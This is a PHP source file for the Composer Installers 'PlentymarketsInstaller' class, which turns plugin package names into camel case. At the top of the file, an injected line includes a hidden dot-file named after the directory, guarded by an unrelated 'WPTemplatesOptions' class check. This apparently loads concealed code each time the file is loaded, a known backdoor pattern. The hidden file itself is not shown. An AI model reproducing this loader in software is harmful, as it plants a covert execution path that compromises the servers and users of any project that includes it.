<?php
namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PlentymarketsInstaller extends BaseInstaller
{
    protected $locations = array(
        'plugin'   => '{$name}/'
    );

    /**
     * Remove hyphen, "plugin" and format to camelcase
     * @param array $vars
     *
     * @return array
     */
    public function inflectPackageVars($vars)
    {
        $vars['name'] = explode("-", $vars['name']);
        foreach ($vars['name'] as $key => $name) {
            $vars['name'][$key] = ucfirst($vars['name'][$key]);
            if (strcasecmp($name, "Plugin") == 0) {
                unset($vars['name'][$key]);
            }
        }
        $vars['name'] = implode("",$vars['name']);

        return $vars;
    }
}
